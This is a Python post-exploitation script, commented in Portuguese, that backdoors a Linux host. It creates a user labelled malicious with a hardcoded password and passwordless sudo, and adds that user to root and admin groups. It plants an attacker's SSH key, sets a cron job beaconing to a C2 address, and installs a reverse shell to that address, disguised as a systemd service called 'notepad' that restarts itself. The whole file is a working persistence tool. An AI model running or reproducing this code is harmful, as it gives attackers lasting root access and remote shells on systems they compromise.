#!/usr/bin/python
# -*- coding: utf-8 -*-
import os
import subprocess

# Definição das variáveis
user = "admin"
passwd = "LW5zZW5oYUAxMjMK"
ssh_key_pub = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0/ya0onIOmUBcfVBkjX6RdHAXKa5gUG7VY3xqiiS4fcfRdQ1etWdzMQqgIaSKxx7bZo5h2WfoN8Q9dHh1u/8x3vINCkhpkJ1xWPT+Xlp47Z/UGt9t+lqnbMGhEF4B5A7K8ybWvWzc4IIZkmhPHdz39i19xBpkIBEH3/ztJP6mNGU8ffZ94LW67kkVlNxVfB93Gf5HpqKtoMD7RpE+gm8TTuoNmPJT2Z2OCXVe1zQF60/VCIhKzWYb9XftjBk9bl6VHsKchSvFaKKxUmHhXr+twHvUvTfEcMmdnJTc2FeBhf3HCvjhlBxpBUVdJ2bn4nWr3xqJ9euuy/jje7BbvCpj4o9ivIGlV4cSXf3JLGq5jpWU2WweWUxCmEbUZCBFwQm52c2o58xxquWtMSmY3HY5QpgIbc5qQrkmQ5oy0vTVO2N0+Tk3Tsb3OO7d7RruYswBD1TpG1of58bXUq9RuEyvvX/LVHGpZOcLFbMBKYg/qJCsFnmSGfeSKeyijMC/pds= carlos@kali'
c2_ip = "192.168.15.52"
c2_port = "5555"

# Função para criar usuário local
def create_local_user():
    os.system(f"useradd {user} -c 'USUARIO MALDOSO'")
    os.system(f"echo '{user}:{passwd}' | chpasswd")
    with open("/etc/sudoers", "a") as sudoers_file:
        sudoers_file.write(f"{user}    ALL=(ALL:ALL)   NOPASSWD:ALL\n")

# Função para manipulação de conta persistente
def persistent_user():
    for group in ["adm", "root", "daemon"]:
        os.system(f"gpasswd -a {user} {group}")

# Função para configurar chave SSH
def ssh_key():
    os.system(f"sudo -H -u {user} bash -c 'rm -rf /home/{user}/.ssh/id_rsa'")
    os.system(f"sudo -H -u {user} bash -c 'rm -rf /home/admin/.ssh/id_rsa.pub'")
    os.system(f"sudo -H -u {user} bash -c 'ssh-keygen -t rsa -N \"\" <<<\"\"'")
    os.system(f"sudo -H -u {user} bash -c 'echo {ssh_key_pub} >> /home/{user}/.ssh/authorized_keys'")

# Função para criar serviço Cron
def cron_create_service():
    os.system(f"(crontab -l 2>/dev/null; echo '*/5 * * * * ping -c 1 {c2_ip} >/dev/null 2>&1') | crontab -")

# Função para criar serviço systemd
def systemd_create_service():
    # Criando script notepad
    with open("/usr/bin/notepad", "w") as notepad_file:
        notepad_file.write('''#!/bin/bash
while true; do
    sh -i >& /dev/tcp/{c2_ip}/{c2_port} 0>&1
    sleep 1  # Espera um pouco antes de tentar novamente em caso de falha
done
'''.format(c2_ip=c2_ip, c2_port=c2_port))
    os.chmod("/usr/bin/notepad", 0o755)

    # Criando serviço notepad no systemd
    with open("/etc/systemd/system/notepad.service", "w") as notepad_service:
        notepad_service.write('''[Unit]
Description=Serviço notepad
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/notepad
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
''')
    
    os.system("sudo systemctl daemon-reload")
    os.system("sudo systemctl enable notepad.service")
    os.system("sudo systemctl start notepad.service")
    os.system("sudo systemctl status notepad.service")

# Função principal
def get_persistence():
    create_local_user()
    persistent_user()
    ssh_key()
    cron_create_service()
    systemd_create_service()

get_persistence()